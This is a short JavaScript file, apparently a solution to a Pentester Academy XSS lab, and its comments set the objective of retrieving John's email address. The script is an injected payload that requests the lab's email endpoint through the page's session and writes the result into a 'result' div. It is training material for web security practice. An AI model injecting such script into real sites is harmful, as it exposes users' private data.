// https://pentesteracademylab.appspot.com/lab/webapp/jfp/14

// Objectives:
//     Find John's Email Address using an XSS vulnerability on this page
//     Display the Email address in the div with id "result"


const http = new XMLHttpRequest();
const url = 'https://pentesteracademylab.appspot.com/lab/webapp/jfp/14/email?name=john';
http.open('GET', url);
http.send();

http.onreadystatechange = function (){
    if (this.readyState == 4 && this.status == 200){
        // alert(http.responseText);
        const h4 = document.createElement('h4');
        h4.innerText = http.responseText;

        const div = document.getElementById('result');
        div.appendChild(h4);
    }
}